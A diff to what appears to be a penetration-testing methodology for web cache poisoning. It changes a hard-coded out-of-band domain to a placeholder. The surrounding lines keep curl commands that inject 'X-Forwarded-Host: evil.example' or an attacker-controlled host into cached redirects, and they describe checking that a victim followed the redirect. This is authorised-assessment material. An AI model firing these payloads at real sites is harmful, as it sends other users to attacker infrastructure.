@@ -19,7 +19,7 @@ vuln_class: cache-poisoning
 
 - `vigil assess kali exec -- curl ...` (header injection probing and cache behavior analysis — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30` for probing calls)
 - `vigil assess anomaly-score` — for unkeyed-input discovery (§2/§3): record one response per candidate header/cookie and let it rank which injected input actually shifted the response, instead of diffing curl bodies by eye.
-- `vigil oob mint` / `vigil oob poll` — for redirect-based poisoning (§9) where the poisoned `Location` points at attacker infra: `mint` binds the nonce under a running client's interactsh id and prints the exact host (`$OOB_HOST`, of shape `<nonce>.<client-id>.oob.example.com`) so `poll` can correlate it — pass `--client <name>` when several clients run. Force the exact host mint prints into the cached redirect, then `poll` to confirm a victim followed it. Replaces reading the raw listener log. Readiness: `vigil oob status --json`.
+- `vigil oob mint` / `vigil oob poll` — for redirect-based poisoning (§9) where the poisoned `Location` points at attacker infra: `mint` binds the nonce under a running client's interactsh id and prints the exact host (`$OOB_HOST`, of shape `<nonce>.<client-id>.<configured-oob-domain>`) so `poll` can correlate it — pass `--client <name>` when several clients run. Force the exact host mint prints into the cached redirect, then `poll` to confirm a victim followed it. Replaces reading the raw listener log. Readiness: `vigil oob status --json`.
 - `Param Miner` (Burp extension for unkeyed header/parameter discovery)
 - Browser (verify poisoned responses served to other users)
 
@@ -111,7 +111,7 @@ curl -H "Accept-Encoding: gzip" -H "X-Forwarded-Host: evil.example" https://targ
 ```bash
 vigil oob mint --client <name> --technique cache-poison --target-url "https://target/" \
   --param X-Forwarded-Host --probe-kind redirect-poison
-# → host  <nonce>.<client-id>.oob.example.com   (= $OOB_HOST)
+# → host  <nonce>.<client-id>.<configured-oob-domain>   (= $OOB_HOST)
 # Poison: force the cached Location to the exact host mint printed ($OOB_HOST)
 curl -H "X-Forwarded-Host: $OOB_HOST" -H "X-Forwarded-Scheme: https" https://target/
 # Confirm: a victim (or your own clean fetch of the cached entry) followed it
